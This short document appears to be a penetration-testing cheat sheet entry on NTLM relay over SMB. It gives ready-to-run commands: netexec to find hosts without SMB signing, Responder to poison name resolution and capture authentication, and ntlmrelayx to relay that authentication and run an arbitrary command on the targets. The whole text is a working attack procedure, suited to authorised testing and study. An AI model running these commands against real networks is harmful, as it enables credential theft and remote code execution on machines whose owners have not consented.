# Over SMB

We first need to turn off the `SMB` server in Responder from the configuration file found in `/etc/responder/Responder.conf`.

```powershell
# Discover relayable hosts
nxc smb $CIDR --gen-relay-list relay.txt

# Execute responder in poisoning mode
sudo responder -I tun0

# Relay NTLM with ntlmrelayx
sudo ntlmrelayx.py -tf relay.txt -smb2support

# Test command execution
sudo ntlmrelayx.py -tf relay.txt -smb2support -c '$CMD'
```
